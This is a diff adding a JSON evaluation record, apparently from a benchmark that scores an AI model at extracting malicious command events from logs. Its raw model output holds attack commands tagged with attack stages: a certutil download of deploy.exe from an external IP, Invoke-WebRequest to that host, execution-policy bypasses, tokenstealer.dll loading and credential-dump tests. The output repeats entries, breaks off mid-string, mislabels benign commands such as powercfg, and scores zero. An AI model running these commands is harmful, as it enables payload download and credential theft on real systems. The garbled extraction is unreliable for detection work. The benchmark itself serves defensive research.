@@ -1,0 +1,44 @@
+{
+  "output": {
+    "malicious_events": [],
+    "narrative": "",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 58734,
+      "completion_tokens": 1536,
+      "total_tokens": 60270,
+      "wall_clock_s": 41.381,
+      "parse_retries": 1
+    },
+    "_raw_text": "{\n  \"malicious_events\": [\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C .\\timestomp.ps1\", \"stage\": \"Defense Evasion\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1003.003\", \"stage\": \"Collection\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"\", \"stage\": \"Command and Control\"},\n    {\"command\": \"powercfg.exe /lastwake\", \"stage\": \"Discovery\"},\n    {\"command\": \"powercfg.exe /energy\", \"stage\": \"Discovery\"},\n    {\"command\": \"powercfg.exe /batteryreport\", \"stage\": \"Discovery\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C .\\\\atomic-red-team-master\\\\modules\\\\ad_migrate\\\\migrate.ps1\", \"stage\": \"Credential Access\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Create-Token-Leak\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Add-Type -MemberDefinition '[DllImport(\\\"kernel32\\\",CharSet = \\\"Unicode\\\",ExactSpelling = true)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);', \"  , \"stage\": \"Defense Evasion\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C $proc = Get-WmiObject Win32_Process -Filter \\\"Caption = 'chrome.exe'\", \"stage\": \"Collection\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C $process = Get-Process -Name chrome\", \"stage\": \"Collection\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C $handle = (Get-Process chrome).MainWindowHandle\", \"stage\": \"Collection\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Add-Member -InputObject ([byte[]](Get-Content -Raw wwwroot\\bin\\release\\bin\\tokenstealer.dll),([text.encoding]::unicode).getbytes(\"  , \"stage\": \"Defense Evasion\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Add-Member -InputObject ([byte[]](Get-Content -Raw wwwroot\\bin\\release\\bin\\tokenstealer.dll),([text.encoding]::unicode).getbytes(\", \"stage\": \"Defense Evasion\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Add-Member -InputObject ([byte[]](Get-Content -Raw wwwroot\\bin\\release\\bin\\tokenstealer.dll),([text.encoding]::unicode).getbytes(', \"  , \"stage\": \"Defense Evasion\"},\n    {\"command\": \"powercfg.exe /lastwake\", \"stage\": \"Discovery\"},\n    {\"command\": \"powercfg.exe /energy\", \"stage\": \"Discovery\"},\n    {\"command\": \"powercfg.exe /batteryreport\", \"stage\": \"Discovery\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C .\\\\atomic-red-team-master\\\\modules\\\\ad_migrate\\\\migrate.ps1\", \"stage\": \"Credential Access\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Create-Token-Leak\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Add-Type -MemberDefinition '[DllImport(\\\"kernel32\\\",CharSet = \\\"Unicode\\\",ExactSpelling = true)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);', \"  , \"stage\": \"Defense Evasion\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C $proc = Get-WmiObject Win32_Process -Filter \\\"Caption = 'chrome.exe'\", \"stage\": \"Collection\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C $process = Get-Process -Name chrome\", \"stage\": \"Collection\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C $handle = (Get-Process chrome).MainWindowHandle\", \"stage\": \"Collection\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Add-Member -InputObject ([byte[]](Get-Content -Raw wwwroot\\bin\\release\\bin\\tokenstealer.dll),([text.encoding]::unicode).getbytes(\"  , \"stage\": \"Defense Evasion\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Add-Member -InputObject ([byte[]](Get-Content -Raw wwwroot\\bin\\release\\bin\\tokenstealer.dll),([text.encoding]::unicode).getbytes(\", \"stage\": \"Defense Evasion\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C Add-Member -InputObject ([byte[]](Get-Content -Raw wwwroot\\bin\\release\\bin\\tokenstealer.dll),([text.encoding]::unicode).getbytes(', \"  , \"stage\": \"Defense Evasion\"},\n    {\"command\": \"CertUtil -hashfile C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\", \"stage\": \"Defense Evasion\"},\n    {\"command\": \"CertUtil -hashfile C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\services\", \"stage\": \"Defense Evasion\"},\n    {\"command\": \"(Get-NetTCPConnection).Where{($_.State -eq 'Established')} | Select-Object -Expandproperty @{Label='ProcessId';Expression={$_.OwningProcess}},@{Label='LocalAddress';Expression={$_.LocalAddress}},@{Label='ForeignAddress';Expression={$_.RemoteAddr}} | Export-CSV -Path C:\\\\tmp\\\\tcp.csv -NoTypeInformation\", \"stage\": \"Defense Evasion\"},\n    {\"command\": \"CertUtil -hashfile C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\", \"stage\": \"Defense Evasion\"},\n    {\"command\": \"CertUtil -hashfile C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\services\", \"stage\": \"Defense Evasion\"},\n    {\"command\": \"(Get-NetTCPConnection).Where{($_.State -eq 'Established')} | Select-Object -Expandproperty @{Label='ProcessId';Expression={$_.OwningProcess}},@{Label='LocalAddress';Expression={$_.LocalAddress}},@{Label='ForeignAddress';Expression={$_.RemoteAddr}} | Export-CSV -Path C:\\\\tmp\\\\tcp.csv -NoTypeInformation\", \"stage\": \"Defense Evasion\"},\n    {\"command\": \"net stop wuauserv && ren C:\\\\Windows\\\\SoftwareDistribution SoftwareDistribution.old\", \"stage\": \"Persistence\"},\n    {\"command\": \"pip install pystache==0.5.4\", \"stage\": \"Defense Evasion\"},\n    {\"command\": \"certutil.exe -urlcache -quiet -split -f http://124.223.85.207:8082/deploy.exe deploy.exe\", \"stage\": \"Command and Control\"},\n    {\"command\": \"powershell.exe -ExecutionPolicy Bypass -C New-Item -ItemType SymbolicLink -Path C:\\\\Users\\\\Administrator\\\\AppData\\\\Roaming\\\\Microsoft"
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 0,
+      "fn": 14
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 0,
+      "fn": 14,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 58734,
+      "completion_tokens": 1536,
+      "total_tokens": 60270,
+      "wall_clock_s": 41.381,
+      "parse_retries": 1
+    }
+  }
+}
